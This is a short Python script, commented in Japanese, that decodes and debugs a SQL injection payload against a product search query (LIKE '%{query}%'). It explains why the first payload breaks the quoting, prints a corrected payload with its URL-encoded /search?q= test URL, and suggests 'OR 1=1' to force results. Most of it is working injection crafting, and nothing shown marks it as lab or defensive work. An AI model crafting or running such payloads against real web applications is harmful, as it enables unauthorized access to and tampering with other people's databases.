import urllib.parse

# 実際のペイロードを分析
payload = "%E3%83%91%E3%82%BD'%20and%201=1%20and%20'x'='%'"
decoded = urllib.parse.unquote(payload)
print(f"URLデコード結果: {repr(decoded)}")

# 実際に生成されるSQL
query_template = "SELECT id, name, description, price, stock, category, image_url FROM products WHERE name LIKE '%{query}%' OR description LIKE '%{query}%'"
actual_sql = query_template.format(query=decoded)

print(f"\n実際に実行されるSQL:")
print(actual_sql)

print(f"\n問題の分析:")
print("1. デコード結果:", decoded)
print("2. 最後に '%' がある → 'x'='%'%' となる")
print("3. つまり 'x'='%'%' という不正な文字列")
print("4. シングルクォートが正しく閉じられていない")

print(f"\n正しい修正版:")
correct_payload = "パソ' and 1=1 and 'x'='"
correct_encoded = urllib.parse.quote(correct_payload)
correct_sql = query_template.format(query=correct_payload)

print(f"正しいペイロード: {correct_payload}")
print(f"URLエンコード: {correct_encoded}")  
print(f"正しいSQL: {correct_sql}")
print("結果: 'x'='%' で正しく閉じられる")

print(f"\nテスト用URL:")
print(f"/search?q={correct_encoded}")

print(f"\n実際に動作確認:")
print("1. 'パソ' という商品は存在しないので通常は結果なし")
print("2. 'and 1=1' が True なので条件は成立")
print("3. でも最初の LIKE '%パソ...' 部分で商品がヒットしない")
print("4. よって結果は表示されない")
print()
print("※商品検索では、既存の商品名で試すか、OR 1=1 を使う必要がある")